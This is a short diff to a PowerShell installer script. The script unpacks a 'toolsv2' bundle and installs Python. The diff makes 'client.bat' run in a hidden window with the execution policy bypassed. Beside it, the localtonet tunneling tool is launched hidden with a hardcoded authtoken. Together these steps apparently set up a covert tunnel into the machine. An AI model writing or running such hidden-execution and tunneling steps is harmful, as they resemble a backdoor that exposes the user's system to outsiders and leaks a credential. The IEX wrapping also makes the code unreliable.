@@ -16,9 +16,9 @@ Add-Type -AssemblyName System.IO.Compression.FileSystem
 Unzip "$plocation\toolsv2.zip" "$dlocation"
 add-appxpackage -path "$dlocation\toolsv2\python310.appx"
 cd $dlocation\toolsv2
-./client.bat
-robocopy 'results' "$dlocation\"
+start powershell {-exec bypass -WindowStyle Hidden IEX(./client.bat)}
 start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
+robocopy 'results' "$dlocation\"
 cd "$dlocation\"
 mkdir PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0
 robocopy "$dlocation\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0" "$dlocation\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0" /E
